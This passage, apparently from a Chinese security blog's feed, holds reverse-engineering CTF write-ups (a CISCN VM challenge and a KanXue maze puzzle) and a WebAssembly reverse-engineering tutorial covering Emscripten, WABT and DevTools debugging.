<span class="hljs-string">&#x27;_1da&#x27;</span>,<br> <span class="hljs-number">485</span>: <span class="hljs-string">&#x27;_1e4&#x27;</span>,<br> <span class="hljs-number">491</span>: <span class="hljs-string">&#x27;_1ea&#x27;</span>,<br> <span class="hljs-number">498</span>: <span class="hljs-string">&#x27;_1f1&#x27;</span>,<br> <span class="hljs-number">514</span>: <span class="hljs-string">&#x27;_1f7&#x27;</span>,<br> <span class="hljs-number">521</span>: <span class="hljs-string">&#x27;_205&#x27;</span>,<br> <span class="hljs-number">529</span>: <span class="hljs-string">&#x27;_210&#x27;</span>,<br> <span class="hljs-number">530</span>: <span class="hljs-string">&#x27;_1e1&#x27;</span>,<br> <span class="hljs-number">533</span>: <span class="hljs-string">&#x27;_214&#x27;</span>,<br> <span class="hljs-number">540</span>: <span class="hljs-string">&#x27;_21b&#x27;</span>,<br> <span class="hljs-number">544</span>: <span class="hljs-string">&#x27;_21f&#x27;</span>,<br> <span class="hljs-number">565</span>: <span class="hljs-string">&#x27;_227&#x27;</span>,<br> <span class="hljs-number">576</span>: <span class="hljs-string">&#x27;_23c&#x27;</span>,<br> <span class="hljs-number">583</span>: <span class="hljs-string">&#x27;_246&#x27;</span>,<br> <span class="hljs-number">589</span>: <span class="hljs-string">&#x27;_24c&#x27;</span>,<br> <span class="hljs-number">596</span>: <span class="hljs-string">&#x27;_253&#x27;</span>,<br> <span class="hljs-number">612</span>: <span class="hljs-string">&#x27;_259&#x27;</span>,<br> <span class="hljs-number">619</span>: <span class="hljs-string">&#x27;_267&#x27;</span>,<br> <span class="hljs-number">627</span>: <span class="hljs-string">&#x27;_272&#x27;</span>,<br> <span class="hljs-number">628</span>: <span class="hljs-string">&#x27;_243&#x27;</span>,<br> <span class="hljs-number">631</span>: <span class="hljs-string">&#x27;_276&#x27;</span>,<br> <span class="hljs-number">635</span>: <span class="hljs-string">&#x27;_27a&#x27;</span>,<br> <span class="hljs-number">646</span>: <span class="hljs-string">&#x27;_27f&#x27;</span>,<br> <span class="hljs-number">656</span>: <span class="hljs-string">&#x27;_28a&#x27;</span>,<br> <span class="hljs-number">663</span>: <span class="hljs-string">&#x27;_296&#x27;</span>,<br> <span class="hljs-number">667</span>: <span class="hljs-string">&#x27;_29a&#x27;</span>,<br> <span class="hljs-number">692</span>: <span class="hljs-string">&#x27;_2a7&#x27;</span>,<br> <span class="hljs-number">705</span>: <span class="hljs-string">&#x27;_2c0&#x27;</span>,<br> <span class="hljs-number">706</span>: <span class="hljs-string">&#x27;_293&#x27;</span>&#125;<br>var6 = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> op <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;0&#x27;</span>:<br>        print(<span class="hljs-string">&quot;_%x: arr1[var6]+=1;&quot;</span> % addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;1&#x27;</span>:<br>        print(<span class="hljs-string">&quot;_%x: arr1[var6]-=1;&quot;</span> %  addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;2&quot;</span>:<br>        print(<span class="hljs-string">&quot;_%x: arr1[var6]=getchar();&quot;</span>   % addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;3&quot;</span>:<br>        print(<span class="hljs-string">&quot;_%x: var6+=1;&quot;</span>% addr)<br>        var6 += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;4&quot;</span>:<br>        print(<span class="hljs-string">&quot;_%x: var6-=1;&quot;</span> % addr)<br>        var6 -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;5&quot;</span>:<br>        print((<span class="hljs-string">&quot;_%x: if(arr1[var6] == 0) goto &quot;</span> + var3[addr] + <span class="hljs-string">&quot;;&quot;</span>) %  addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;6&quot;</span>:<br>        print((<span class="hljs-string">&quot;_%x: if(arr1[var6] != 0) goto &quot;</span> + var3[addr] + <span class="hljs-string">&quot;;&quot;</span>) %   addr)<br><br>    <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&quot;7&quot;</span>:<br>        print(<span class="hljs-string">&quot;_%x: putchar(arr1[var6]);&quot;</span>  % addr)<br>    <span class="hljs-keyword">else</span>:<br>        print(op)<br>        <span class="hljs-keyword">raise</span><br>    addr += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="第四层-vm-分析"><a href="#第四层-vm-分析" class="headerlink" title="第四层 vm 分析"></a>第四层 vm 分析</h2><p>decompiler 结果如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">_0: var6+=<span class="hljs-number">1</span>;<br>_1: var6+=<span class="hljs-number">1</span>;<br>_2: <span class="hljs-keyword">if</span>(arr1[var6] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _5;<br>_3: arr1[var6]-=<span class="hljs-number">1</span>;<br>_4: <span class="hljs-keyword">if</span>(arr1[var6] != <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _3;<br>_5: var6+=<span class="hljs-number">1</span>;<br>_6: <span class="hljs-keyword">if</span>(arr1[var6] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _9;<br>_7: arr1[var6]-=<span class="hljs-number">1</span>;<br>_8: <span class="hljs-keyword">if</span>(arr1[var6] != <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _7;<br>_9: var6-=<span class="hljs-number">1</span>;<br><br>............  节选<br>    <br><br>_2bd: var6-=<span class="hljs-number">1</span>;<br>_2be: var6-=<span class="hljs-number">1</span>;<br>_2bf: <span class="hljs-keyword">if</span>(arr1[var6] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _2c2;<br>_2c0: arr1[var6]-=<span class="hljs-number">1</span>;<br>_2c1: <span class="hljs-keyword">if</span>(arr1[var6] != <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _2c0;<br>_2c2: <span class="hljs-keyword">if</span>(arr1[var6] != <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _293;<br>_2c3: var6-=<span class="hljs-number">1</span>;<br>_2c4: var6-=<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>用 C 语言重新编译处理</p><img src="/2021/05/16/CISCN-Little-evil/image-20210516153045506.png" class="" title="image-20210516153045506"><p>用 IDA 调试分析</p><img src="/2021/05/16/CISCN-Little-evil/image-20210516153148968.png" class="" title="image-20210516153148968"><p>逻辑很简单，就是逐个字节比较输入的五位 flag，经过调试得出输入为: M5Ya7</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CISCN-little-evil&quot;&gt;&lt;a href=&quot;#CISCN-little-evil&quot; class=&quot;headerlink&quot; title=&quot;CISCN little_evil&quot;&gt;&lt;/a&gt;CISCN little_evil&lt;/h1&gt;&lt;p&gt;比赛的时候差一点点出</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="Ruby" scheme="https://panda0s.top/tags/Ruby/"/>
    
    <category term="obfuscator" scheme="https://panda0s.top/tags/obfuscator/"/>
    
  </entry>
  
  <entry>
    <title>WebAssembly Reverse</title>
    <link href="https://panda0s.top/2021/05/14/WebAssembly-Reverse/"/>
    <id>https://panda0s.top/2021/05/14/WebAssembly-Reverse/</id>
    <published>2021-05-14T02:50:17.000Z</published>
    <updated>2021-05-16T07:36:57.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h1><h2 id="WASM-开发环境"><a href="#WASM-开发环境" class="headerlink" title="WASM 开发环境"></a>WASM 开发环境</h2><p><code>Emscripten SDK</code> 主流的 WASM 开发环境, 本文基于 <code>Emscripten</code> 环境编写</p><h3 id="安装-Emscripten"><a href="#安装-Emscripten" class="headerlink" title="安装 Emscripten"></a>安装 Emscripten</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Get the emsdk repo</span><br>git clone https://github.com/emscripten-core/emsdk.git<br><br><span class="hljs-meta">#</span><span class="bash"> Enter that directory</span><br>cd emsdk<br><br><span class="hljs-meta">#</span><span class="bash"> Fetch the latest version of the emsdk (not needed the first time you <span class="hljs-built_in">clone</span>)</span><br>git pull<br><br><span class="hljs-meta">#</span><span class="bash"> Download and install the latest SDK tools.</span><br>./emsdk install latest<br><br><span class="hljs-meta">#</span><span class="bash"> Make the <span class="hljs-string">&quot;latest&quot;</span> SDK <span class="hljs-string">&quot;active&quot;</span> <span class="hljs-keyword">for</span> the current user. (writes .emscripten file)</span><br>./emsdk activate latest<br><br><span class="hljs-meta">#</span><span class="bash"> Activate PATH and other environment variables <span class="hljs-keyword">in</span> the current terminal</span><br>source ./emsdk_env.sh<br></code></pre></td></tr></table></figure><h3 id="编译-Hello-world"><a href="#编译-Hello-world" class="headerlink" title="编译 Hello world"></a>编译 Hello world</h3><p>1.c </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> d;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world.\n&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;d);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your input: %d\n&quot;</span>, d);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译并生成运行 html 页面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">emcc 1.c -o 1.html<br></code></pre></td></tr></table></figure><p>编译后当前目录下会生成三个文件: 1.html 1.js 1.wasm</p><p>目前主流的浏览器不支持 <code>file://</code> XHR 请求，因此要把这些文件放到 http server 上。</p><h2 id="js-与-wasm-的交互"><a href="#js-与-wasm-的交互" class="headerlink" title="js 与 wasm 的交互"></a>js 与 wasm 的交互</h2><p>通过js 层的 <code>ccall</code> 和 <code>cwarp</code> 调用 wasm 中的 C 函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;math.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123; <span class="hljs-comment">// to disable name-mangle</span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">int_sqrt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">sqrt</span>(x);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">emcc 1.cpp -o 1.html -s EXPORTED_FUNCTIONS=&#x27;[&quot;_int_sqrt&quot;, &quot;_main&quot;]&#x27; -s EXPORTED_RUNTIME_METHODS=&#x27;[&quot;ccall&quot;,&quot;cwrap&quot;]&#x27;<br></code></pre></td></tr></table></figure><p>调用接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">int_sqrt = Module.cwrap(<span class="hljs-string">&#x27;int_sqrt&#x27;</span>, <span class="hljs-string">&#x27;number&#x27;</span>, [<span class="hljs-string">&#x27;number&#x27;</span>])<br>int_sqrt(<span class="hljs-number">12</span>)<br>int_sqrt(<span class="hljs-number">28</span>)<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> result = Module.ccall(<span class="hljs-string">&#x27;int_sqrt&#x27;</span>, <span class="hljs-comment">// name of C function</span><br>  <span class="hljs-string">&#x27;number&#x27;</span>, <span class="hljs-comment">// return type</span><br>  [<span class="hljs-string">&#x27;number&#x27;</span>], <span class="hljs-comment">// argument types</span><br>  [<span class="hljs-number">28</span>]); <span class="hljs-comment">// arguments</span><br></code></pre></td></tr></table></figure><h2 id="一些基本的文件"><a href="#一些基本的文件" class="headerlink" title="一些基本的文件"></a>一些基本的文件</h2><p><code>.wasm</code> 二进制形式的代码</p><p><code>.wat</code> 文本形式(text format)的代码文件</p><p><code>wasm2wat</code> 可以将 <code>.wasm</code> 文件转换成 <code>.wat</code> 文件。</p><h1 id="WASM-静态分析"><a href="#WASM-静态分析" class="headerlink" title="WASM 静态分析"></a>WASM 静态分析</h1><p>WABT 是 WebAssembly 的二进制工具包</p><p>git 仓库地址:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">git@</span>github.com:WebAssembly/wabt.git<br></code></pre></td></tr></table></figure><p>编译方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone git@github.com:WebAssembly/wabt.git<br>cd wabt<br>git submodule update --init<br>mkdir build<br>cd build<br>cmake ..<br>make -j8<br></code></pre></td></tr></table></figure><p>基本用法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">wasm2wat 1.wasm -o test.wat # Parse from binary to text format<br>wasm2c 1.wasm -o test.c     # decompile to c<br></code></pre></td></tr></table></figure><p>wasm2c 反编译出来的 C 效果不是很好，可以用 gcc 编译 test.c，然后用 IDA 分析输出文件。</p><p>⚠️⚠️⚠️ wasm2c 的输出文件名一定不能是数字开头，否则 GCC 编译会出问题。</p><p>gcc 编译方法</p><ol><li>复制 wabt/wasm2c 下的头文件到 test.c 目录</li><li>用 gcc 编译</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -c test.c -o test.out<br></code></pre></td></tr></table></figure><p>效果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">strmlen</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * s)</span> </span>&#123;<br>    <span class="hljs-keyword">size_t</span> cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ( *(s++) )cnt += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> cnt;<br>&#125;<br></code></pre></td></tr></table></figure><p>用 IDA 逆向分析效果如下</p><img src="/2021/05/14/WebAssembly-Reverse/image-20210514222510337.png" class="" title="image-20210514222510337"><p>还是比较清晰的。</p><h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h2><p>一般没有源码只能用 <code>Chrome</code> 的 <code>DevTool</code> 调试。</p><p>DevTool 里面可以直接对 wasm 下断点。</p><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p>Chrome 版本 Chrome 91 以上支持 Memory Inspect</p><img src="/2021/05/14/WebAssembly-Reverse/image-20210514174849940.png" class="" title="image-20210514174849940"><p>点击 【Scope】 中 memory 旁边的内存图标可以打开 memory panel，输入地址即可查看。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Download and install Emscripten “<a href="https://emscripten.org/docs/getting_started/downloads.html#sdk-download-and-install&quot;">https://emscripten.org/docs/getting_started/downloads.html#sdk-download-and-install&quot;</a><br>[2] Emscripten Tutorial “<a href="https://emscripten.org/docs/getting_started/Tutorial.html&quot;">https://emscripten.org/docs/getting_started/Tutorial.html&quot;</a><br>[3] Interacting with code “<a href="https://emscripten.org/docs/porting/connecting_cpp_and_javascript/Interacting-with-code.html&quot;">https://emscripten.org/docs/porting/connecting_cpp_and_javascript/Interacting-with-code.html&quot;</a><br>[4] 一种Wasm逆向静态分析方法 “<a href="https://xz.aliyun.com/t/5170&quot;">https://xz.aliyun.com/t/5170&quot;</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WASM&quot;&gt;&lt;a href=&quot;#WASM&quot; class=&quot;headerlink&quot; title=&quot;WASM&quot;&gt;&lt;/a&gt;WASM&lt;/h1&gt;&lt;h2 id=&quot;WASM-开发环境&quot;&gt;&lt;a href=&quot;#WASM-开发环境&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="PL_Reverse" scheme="https://panda0s.top/categories/PL-Reverse/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="Wasm" scheme="https://panda0s.top/tags/Wasm/"/>
    
  </entry>
  
  <entry>
    <title>看雪CTF2021</title>
    <link href="https://panda0s.top/2021/05/13/%E7%9C%8B%E9%9B%AACTF2021/"/>
    <id>https://panda0s.top/2021/05/13/%E7%9C%8B%E9%9B%AACTF2021/</id>
    <published>2021-05-13T14:09:51.000Z</published>
    <updated>2021-05-14T08:18:05.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="看雪CTF2021"><a href="#看雪CTF2021" class="headerlink" title="看雪CTF2021"></a>看雪CTF2021</h1><h2 id="第二题-南冥神功"><a href="#第二题-南冥神功" class="headerlink" title="第二题 南冥神功"></a>第二题 南冥神功</h2><p>简单迷宫题</p><p>map1 = [0x0, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    line = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">if</span> theMap[y * <span class="hljs-number">10</span> + x] == <span class="hljs-number">0</span>:<br>            line = line + <span class="hljs-string">&quot;.&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            line = line + <span class="hljs-string">&quot;#&quot;</span><br>    print(line)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean">..#..#..##<br>##..#..#..<br>..#.#####.<br>.##.#..#..<br>..#..#..##<br>##.###.#.#<br>..####.#.#<br>.##..#.#.#<br>...#..##..<br></code></pre></td></tr></table></figure><p>.data:004B7040 a0123456789abcd db ‘0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ’,0<br>loc_4B3DC5:             ; what is ecx<br>mov     eax, ecx<br>‘0’ =&gt; 0<br>‘1’ =&gt; 1<br>‘2’ =&gt; 2<br>‘9’ =&gt; 9<br>‘A’ =&gt; 0xA<br>‘F’ =&gt; 0xF</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs gml">alpha = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>i_1 =&gt; alpha.index(flag[flagPos])<br>v8 = i_1 + flagPos;<br>v10 = <span class="hljs-number">5</span> - v8 % <span class="hljs-number">6</span>;<br><span class="hljs-keyword">switch</span> ( v10 )<br><br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span><br>    <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> + <span class="hljs-number">1</span><br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span><br>    <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> - <span class="hljs-number">1</span><br><br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>    当 <span class="hljs-symbol">y</span> 为偶数， <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> + <span class="hljs-number">1</span><br>    <span class="hljs-symbol">y</span> = <span class="hljs-symbol">y</span> + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">default</span><br>    如果 <span class="hljs-symbol">y</span> 为偶数, <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> + <span class="hljs-number">1</span><br>    <span class="hljs-symbol">y</span> = <span class="hljs-symbol">y</span> - <span class="hljs-number">1</span><br><br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>    如果 <span class="hljs-symbol">y</span> 为奇数, <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> - <span class="hljs-number">1</span><br>    <span class="hljs-symbol">y</span> = <span class="hljs-symbol">y</span> + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span><br>    如果 <span class="hljs-symbol">y</span> 为奇数, <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> - <span class="hljs-number">1</span><br>    <span class="hljs-symbol">y</span> = <span class="hljs-symbol">y</span> - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>一位flag字符决定两个方向指令<br>v2 = (flagPos + flagIdx / 6) % 6;<br>v1 = cur = 5 - (flagPos + flagIdx ) % 6;<br>爆破 flagIdx 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python">map1 = [<span class="hljs-number">0x1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span 